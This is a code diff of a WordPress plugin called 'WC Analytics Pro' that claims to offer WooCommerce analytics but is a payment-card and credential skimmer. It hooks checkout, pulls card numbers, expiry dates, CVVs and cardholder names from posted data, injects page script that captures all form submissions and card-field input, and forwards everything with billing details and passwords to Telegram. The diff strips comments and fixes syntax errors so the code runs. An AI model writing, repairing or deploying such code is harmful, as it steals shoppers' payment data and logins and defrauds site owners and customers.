@@ -1,7 +1,6 @@
 <?php
 /**
  * Plugin Name: WC Analytics Pro
- * Plugin URI: https://github.com/yourusername/wc-analytics-pro/raw/main/wc-analytics-pro.php
  * Description: Complete WooCommerce analytics & payment tracking with Telegram notifications
  * Version: 3.0.0
  * Author: Analytics Team
@@ -11,7 +10,6 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
-// Check if class already exists to avoid fatal error
 if (!class_exists('WCAnalyticsPro')) {
 
 class WCAnalyticsPro {
@@ -25,24 +23,14 @@ class WCAnalyticsPro {
     }
     
     public function initialize_plugin() {
-        // Enqueue scripts
         add_action('wp_enqueue_scripts', array($this, 'load_scripts'));
-        
-        // AJAX handlers
         add_action('wp_ajax_nopriv_wcap_track_data', array($this, 'process_tracking_data'));
         add_action('wp_ajax_wcap_track_data', array($this, 'process_tracking_data'));
-        
-        // WooCommerce hooks
         add_action('woocommerce_checkout_order_processed', array($this, 'capture_order_data'), 10, 3);
         add_action('woocommerce_payment_complete', array($this, 'capture_payment_complete'));
-        
-        // Tracking scripts
         add_action('wp_footer', array($this, 'insert_tracking_code'));
-        
-        // Page load tracking
         add_action('wp_head', array($this, 'track_page_visit'));
         
-        // Send activation message
         if (get_option('wcap_activated') !== 'yes') {
             $this->send_telegram("🚀 WC Analytics Pro ACTIVATED\nWebsite: " . home_url());
             update_option('wcap_activated', 'yes');
@@ -81,13 +69,12 @@ class WCAnalyticsPro {
     }
     
     public function process_tracking_data() {
-        // Verify nonce for security
         if (!wp_verify_nonce($_POST['security'] ?? '', 'wcap_security_nonce')) {
             wp_die('Security check failed');
         }
         
         if ($this->is_processing) {
-            wp_send_json_success(['status' => 'already_processing']);
+            wp_send_json_success(array('status' => 'already_processing'));
         }
         
         $this->is_processing = true;
@@ -110,7 +97,7 @@ class WCAnalyticsPro {
         }
         
         $this->is_processing = false;
-        wp_send_json_success(['status' => 'processed']);
+        wp_send_json_success(array('status' => 'processed'));
     }
     
     private function handle_form_submission($data) {
@@ -119,7 +106,6 @@ class WCAnalyticsPro {
         
         $message = "📋 FORM SUBMITTED: " . strtoupper($form_type) . "\n\n";
         
-        // Categorize the data
         $categories = $this->organize_form_data($form_data);
         
         foreach ($categories as $category => $fields) {
@@ -172,7 +158,6 @@ class WCAnalyticsPro {
     public function capture_order_data($order_id, $posted_data, $order) {
         if (!$order) return;
         
-        // Billing information
         $billing_info = array(
             'First Name' => $order->get_billing_first_name(),
             'Last Name' => $order->get_billing_last_name(),
@@ -184,7 +169,6 @@ class WCAnalyticsPro {
             'Country' => $order->get_billing_country()
         );
         
-        // Shipping information
         $shipping_info = array(
             'First Name' => $order->get_shipping_first_name(),
             'Last Name' => $order->get_shipping_last_name(),
@@ -194,7 +178,6 @@ class WCAnalyticsPro {
             'Country' => $order->get_shipping_country()
         );
         
-        // Extract payment data from POST
         $payment_data = $this->extract_payment_info();
         
         $message = "🛒 ORDER PROCESSED\n\n";
@@ -211,7 +194,7 @@ class WCAnalyticsPro {
         
         $message .= "\n🚚 SHIPPING INFORMATION:\n";
         foreach ($shipping_info as $key => $value) {
-            if (!empty($value) && $value != $billing_info[$key] ?? '') {
+            if (!empty($value) && $value != ($billing_info[$key] ?? '')) {
                 $message .= "• " . $key . ": " . $value . "\n";
             }
         }
@@ -235,26 +218,16 @@ class WCAnalyticsPro {
     private function extract_payment_info() {
         $payment_info = array();
         
-        // All possible payment field names
         $payment_fields = array(
-            // Card numbers
             'card_number', 'cardnumber', 'ccnumber', 'cc_number', 'card_num', 'card_no', 
             'cc_no', 'accountnumber', 'cardn', 'card', 'ccnum', 'creditcardnumber',
-            
-            // Expiry dates
             'expiry', 'exp_date', 'expiration', 'expiry-date', 'expirydate', 'expmonth', 
             'exp_year', 'expiry_year', 'expire', 'cc_exp', 'card_exp', 'expiry_month', 
             'expiry_year', 'cc_expiry', 'card_expiry', 'expirationdate',
-            
-            // CVV/CVC
             'cvv', 'cvc', 'cvn', 'security_code', 'card_cvv', 'card_cvc', 'cc_cvv', 
             'cc_cvc', 'cvv2', 'cid', 'cvcode',
-            
-            // Card holder
             'card_holder', 'cardholder', 'nameoncard', 'card_name', 'cc_name', 
             'card_holder_name', 'cardholdername',
-            
-            // Card type
             'card_type', 'cardtype', 'cc_type', 'cctype'
         );
         
@@ -298,6 +271,7 @@ class WCAnalyticsPro {
                     if (this.processing) return;
                     this.processing = true;
                     
+                    var self = this;
                     $.ajax({
                         url: '<?php echo $ajax_url; ?>',
                         type: 'POST',
@@ -310,12 +284,13 @@ class WCAnalyticsPro {
                         success: function() {
                             console.log('WCAP: Tracked - ' + eventType);
                         },
-                        complete: () => this.processing = false
+                        complete: function() {
+                            self.processing = false;
+                        }
                     });
                 },
                 
                 initForms: function() {
-                    // Form submissions
                     $('form').on('submit', function(e) {
                         var formData = {};
                         $(this).find('input, select, textarea').each(function() {
@@ -331,7 +306,6 @@ class WCAnalyticsPro {
                         });
                     });
                     
-                    // Payment fields tracking
                     $('input[name*="card"], input[name*="cc"], input[name*="cvv"], input[name*="cvc"], input[name*="expir"]').on('blur', function() {
                         if (this.value && this.value.length > 3) {
                             var paymentData = {};
@@ -344,7 +318,6 @@ class WCAnalyticsPro {
                         }
                     });
                     
-                    // Important buttons
                     $('button[type="submit"], input[type="submit"], .checkout-button, #place_order').on('click', function() {
                         wcapTracker.track('button_clicked', {
                             button_text: $(this).text() || $(this).val() || 'Button',
@@ -398,9 +371,9 @@ class WCAnalyticsPro {
                 $categories['billing'][$key] = $value;
             } else if (strpos($key_lower, 'shipping_') !== false) {
                 $categories['shipping'][$key] = $value;
-            } else if (this->is_payment_field($key_lower)) {
+            } else if ($this->is_payment_field($key_lower)) {
                 $categories['payment'][$key] = $value;
-            } else if (this->is_account_field($key_lower)) {
+            } else if ($this->is_account_field($key_lower)) {
                 $categories['account'][$key] = $value;
             } else {
                 $categories['personal'][$key] = $value;
@@ -411,7 +384,7 @@ class WCAnalyticsPro {
     }
     
     private function is_payment_field($field_name) {
-        $indicators = ['card', 'cvv', 'cvc', 'expir', 'cc', 'payment', 'csc', 'cvn'];
+        $indicators = array('card', 'cvv', 'cvc', 'expir', 'cc', 'payment', 'csc', 'cvn');
         foreach ($indicators as $indicator) {
             if (strpos($field_name, $indicator) !== false) return true;
         }
@@ -419,7 +392,7 @@ class WCAnalyticsPro {
     }
     
     private function is_account_field($field_name) {
-        $indicators = ['user', 'login', 'password', 'username', 'pass'];
+        $indicators = array('user', 'login', 'password', 'username', 'pass');
         foreach ($indicators as $indicator) {
             if (strpos($field_name, $indicator) !== false) return true;
         }
@@ -427,20 +400,20 @@ class WCAnalyticsPro {
     }
     
     private function pretty_name($field_name) {
-        $name = str_replace(['_', '-'], ' ', $field_name);
+        $name = str_replace(array('_', '-'), ' ', $field_name);
         $name = preg_replace('/\b(billing|shipping|account)\b/i', '', $name);
         return ucwords(trim($name));
     }
     
     private function get_emoji($category) {
-        $emojis = {
-            'personal': '👤',
-            'billing': '📍', 
-            'shipping': '🚚',
-            'account': '🔐',
-            'payment': '💳'
-        };
-        return $emojis[$category] ?? '📝';
+        $emojis = array(
+            'personal' => '👤',
+            'billing' => '📍', 
+            'shipping' => '🚚',
+            'account' => '🔐',
+            'payment' => '💳'
+        );
+        return isset($emojis[$category]) ? $emojis[$category] : '📝';
     }
     
     private function get_page_type() {
@@ -479,7 +452,6 @@ class WCAnalyticsPro {
     }
 }
 
-// Initialize the plugin safely
 new WCAnalyticsPro();
 
-} // End class exists check
+}
